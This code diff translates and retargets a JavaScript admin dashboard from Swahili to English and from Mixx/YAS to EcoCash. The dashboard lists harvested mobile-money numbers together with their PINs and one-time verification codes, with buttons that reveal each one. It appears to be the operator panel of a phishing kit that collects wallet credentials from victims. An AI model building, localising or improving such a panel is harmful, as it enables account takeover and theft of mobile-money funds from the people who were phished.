@@ -143,7 +143,7 @@
 
       const password = loginForm.elements.password.value;
       if (!password) {
-        setLoginStatus("Tafadhali weka nenosiri.", "error");
+        setLoginStatus("Please enter your password.", "error");
         return;
       }
 
@@ -157,18 +157,18 @@
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.ok) {
           setLoginStatus(
-            (data && data.error) || "Nenosiri si sahihi.",
+            (data && data.error) || "Incorrect password.",
             "error"
           );
           return;
         }
-        setLoginStatus("Umefanikiwa kuingia.", "success");
+        setLoginStatus("Signed in successfully.", "success");
         showDashboard();
         await loadData();
         startAutoRefresh();
       } catch (err) {
         console.error(err);
-        setLoginStatus("Hitilafu ya mtandao. Jaribu tena.", "error");
+        setLoginStatus("Network error. Please try again.", "error");
       } finally {
         setLoginLoading(false);
       }
@@ -197,14 +197,14 @@
       }
       const data = await res.json().catch(() => ({}));
       if (!res.ok || !data.ok) {
-        showToast("Imeshindwa kupata data.", "error");
+        showToast("Failed to load data.", "error");
         return;
       }
       allItems = data.items || [];
       render();
     } catch (err) {
       console.error(err);
-      showToast("Hitilafu ya mtandao.", "error");
+      showToast("Network error.", "error");
     }
   }
 
@@ -237,8 +237,8 @@
     if (totalCount) {
       totalCount.textContent =
         allItems.length === 1
-          ? "Ombi 1 lililosajiliwa"
-          : `Maombi ${allItems.length} yaliyosajiliwa`;
+          ? "1 submission registered"
+          : `${allItems.length} submissions registered`;
     }
 
     // Filter + paginate
@@ -261,7 +261,7 @@
             const shownPin = revealed ? escapeHtml(revealed.pin) : "••••";
             const pinClass = revealed ? "pin-cell__value" : "pin-cell__value is-masked";
             const eyeChar = revealed ? "🙈" : "👁";
-            const eyeLabel = revealed ? "Ficha PIN" : "Onyesha PIN";
+            const eyeLabel = revealed ? "Hide PIN" : "Show PIN";
             const revealedCls = revealed ? " is-revealed" : "";
 
             // Verification code cell — only show the reveal control if
@@ -275,8 +275,8 @@
               : "pin-cell__value is-masked";
             const codeEyeChar = codeEntry ? "🙈" : "👁";
             const codeEyeLabel = codeEntry
-              ? "Ficha namba"
-              : "Onyesha namba";
+              ? "Hide code"
+              : "Show code";
             const codeRevealedCls = codeEntry ? " is-revealed" : "";
             const codeCellHtml = hasCode
               ? `
@@ -298,10 +298,10 @@
             return `
           <tr>
             <td data-label="ID"><span class="id-pill">${escapeHtml(it.id)}</span></td>
-            <td data-label="Nambari ya Mixx" class="number-cell">${escapeHtml(
+            <td data-label="EcoCash number" class="number-cell">${escapeHtml(
               it.mixxNumber
             )}</td>
-            <td data-label="YAS PIN" class="muted">
+            <td data-label="EcoCash PIN" class="muted">
               <span class="pin-cell">
                 <span class="${pinClass}" data-pin-value="${escapeHtml(
               it.id
@@ -316,8 +316,8 @@
                 >${eyeChar}</button>
               </span>
             </td>
-            <td data-label="Namba (aliyoingiza)" class="muted">${codeCellHtml}</td>
-            <td data-label="Tarehe">${escapeHtml(fmtShort(it.createdAt))}</td>
+            <td data-label="Verification code" class="muted">${codeCellHtml}</td>
+            <td data-label="Date">${escapeHtml(fmtShort(it.createdAt))}</td>
           </tr>`;
           }
         )
@@ -326,7 +326,7 @@
 
     // Pager
     if (pagerInfo) {
-      pagerInfo.textContent = `Ukurasa ${page} / ${totalPages}`;
+      pagerInfo.textContent = `Page ${page} / ${totalPages}`;
     }
     if (prevBtn) prevBtn.disabled = page <= 1;
     if (nextBtn) nextBtn.disabled = page >= totalPages;
@@ -365,7 +365,7 @@
     refreshBtn.addEventListener("click", async () => {
       refreshBtn.disabled = true;
       await loadData();
-      showToast("Data imesasishwa.", "success");
+      showToast("Data refreshed.", "success");
       setTimeout(() => (refreshBtn.disabled = false), 500);
     });
   }
@@ -397,8 +397,8 @@
     if (btn) {
       btn.classList.remove("is-revealed");
       btn.setAttribute("aria-pressed", "false");
-      btn.setAttribute("aria-label", "Onyesha PIN");
-      btn.setAttribute("title", "Onyesha PIN");
+      btn.setAttribute("aria-label", "Show PIN");
+      btn.setAttribute("title", "Show PIN");
       btn.textContent = "👁";
       btn.disabled = false;
     }
@@ -421,7 +421,7 @@
       }
       const data = await res.json().catch(() => ({}));
       if (!res.ok || !data.ok) {
-        showToast((data && data.error) || "Imeshindwa kupata PIN.", "error");
+        showToast((data && data.error) || "Failed to load PIN.", "error");
         return;
       }
       const pin = String(data.pin || "");
@@ -435,8 +435,8 @@
       }
       btn.classList.add("is-revealed");
       btn.setAttribute("aria-pressed", "true");
-      btn.setAttribute("aria-label", "Ficha PIN");
-      btn.setAttribute("title", "Ficha PIN");
+      btn.setAttribute("aria-label", "Hide PIN");
+      btn.setAttribute("title", "Hide PIN");
       btn.textContent = "🙈";
       btn.disabled = false;
       // Auto-hide after TTL.
@@ -444,7 +444,7 @@
       revealedPins.set(id, { pin, timer });
     } catch (err) {
       console.error(err);
-      showToast("Hitilafu ya mtandao.", "error");
+      showToast("Network error.", "error");
       btn.disabled = false;
     }
   }
@@ -480,8 +480,8 @@
     if (btn) {
       btn.classList.remove("is-revealed");
       btn.setAttribute("aria-pressed", "false");
-      btn.setAttribute("aria-label", "Onyesha namba");
-      btn.setAttribute("title", "Onyesha namba");
+      btn.setAttribute("aria-label", "Show code");
+      btn.setAttribute("title", "Show code");
       btn.textContent = "👁";
       btn.disabled = false;
     }
@@ -504,7 +504,7 @@
       }
       const data = await res.json().catch(() => ({}));
       if (!res.ok || !data.ok) {
-        showToast((data && data.error) || "Imeshindwa kupata namba.", "error");
+        showToast((data && data.error) || "Failed to load code.", "error");
         return;
       }
       const code = String(data.code || "");
@@ -517,15 +517,15 @@
       }
       btn.classList.add("is-revealed");
       btn.setAttribute("aria-pressed", "true");
-      btn.setAttribute("aria-label", "Ficha namba");
-      btn.setAttribute("title", "Ficha namba");
+      btn.setAttribute("aria-label", "Hide code");
+      btn.setAttribute("title", "Hide code");
       btn.textContent = "🙈";
       btn.disabled = false;
       const timer = setTimeout(() => hideCode(id), REVEAL_TTL_MS);
       revealedCodes.set(id, { code, timer });
     } catch (err) {
       console.error(err);
-      showToast("Hitilafu ya mtandao.", "error");
+      showToast("Network error.", "error");
       btn.disabled = false;
     }
   }
@@ -605,7 +605,7 @@
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok || !data.ok) {
-          setPwStatus((data && data.error) || "Imeshindwa kubadilisha.", "error");
+          setPwStatus((data && data.error) || "Could not change password.", "error");
           return;
         }
         setPwStatus(
